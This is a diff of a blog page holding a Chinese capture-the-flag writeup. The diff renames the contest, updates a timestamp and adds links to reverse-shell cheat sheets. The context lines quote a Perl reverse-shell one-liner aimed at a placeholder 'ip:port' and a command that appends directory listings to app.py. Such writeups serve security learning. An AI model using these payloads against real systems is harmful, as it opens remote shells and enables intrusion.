@@ -2,7 +2,7 @@
 <html class="has-navbar-fixed-top">
 <head>
     <meta charset="utf-8">
-<title>V&amp;N招新赛2020 writeup - cjM00N&#39;s blog</title>
+<title>V&amp;N公开赛2020 writeup - cjM00N&#39;s blog</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
@@ -165,13 +165,13 @@
     <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
-            V&amp;N招新赛2020 writeup
+            V&amp;N公开赛2020 writeup
         
     </h1>
     <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
             <span class="column is-narrow">
         
-                  <b><time datetime="2020-02-29T17:04:07.760Z" itemprop="datePublished">Mar 1 2020</time></b> updated
+                  <b><time datetime="2020-03-01T03:29:17.673Z" itemprop="datePublished">Mar 1 2020</time></b> updated
         
             </span>
         
@@ -222,7 +222,10 @@
 <p>这里歪个楼, 在出题人的环境配置不对的情况下, 我们可以通过</p>
 <p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|base64>>app.py</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>的方式来写入app.py, 从而不用反弹shell也可以看到回显, 当然赵师傅没留下这个机会(x</p>
-<p>上网搜了很多个反弹shell的payload, 最后找到一个能用的</p>
+<p>上网搜了很多个反弹shell的payload</p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
+<p>最后找到一个能用的</p>
 <p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ip:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>然后成功返回shell, 但是发现第二个问题, 上面没有<code>lsof</code>, <code>ps</code>也没有反应</p>
 <p>进去</p>
@@ -337,7 +340,7 @@
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200301005934.png" alt></p>
 <p>或者将输出写到<code>/tmp/</code>下, 然后通过任意文件读拿flag也可</p>
 <p>再次感谢两位师傅的帮助和赵师傅的题目</p>
-<p><br></p><blockquote class="colorquote info"><p>本文作者：cjm00n<br>本文地址： <a href="https://cjm00n.top/2020/02/29/V-N招新赛2020-writeup/">https://cjm00n.top/2020/02/29/V-N招新赛2020-writeup/</a> <br>版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
+<p><br></p><blockquote class="colorquote info"><p>本文作者：cjm00n<br>本文地址： <a href="https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/">https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/</a> <br>版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
 </blockquote><p></p>
 </body></html>
     
@@ -371,8 +374,8 @@
     
 <script>
     var disqus_config = function () {
-        this.page.url = 'https://cjm00n.top/2020/02/29/V-N%E6%8B%9B%E6%96%B0%E8%B5%9B2020-writeup/';
-        this.page.identifier = '2020/02/29/V-N招新赛2020-writeup/';
+        this.page.url = 'https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/';
+        this.page.identifier = '2020/02/29/V-N公开赛2020-writeup/';
         
         this.language = 'en';
         
